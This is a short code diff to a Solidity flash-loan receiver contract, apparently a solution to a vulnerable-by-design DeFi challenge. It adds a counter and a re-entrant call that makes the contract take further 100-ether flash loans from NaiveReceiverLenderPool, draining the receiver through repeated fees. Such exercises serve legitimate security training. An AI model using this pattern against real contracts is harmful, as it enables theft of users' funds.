@@ -49,10 +49,16 @@ contract FlashLoanReceiver is IERC3156FlashBorrower {
         SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);
 
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
-    }
+    }  
 
     // Internal function where the funds received would be used
-    function _executeActionDuringFlashLoan() internal { }
+    uint i = 9;
+    function _executeActionDuringFlashLoan() internal { 
+        if(i > 0){
+            i--;
+            NaiveReceiverLenderPool(payable(pool)).flashLoan(IERC3156FlashBorrower(address(this)), ETH, 100 ether, "0x00");
+        }
+    }
 
     // Allow deposits of ETH
     receive() external payable {}
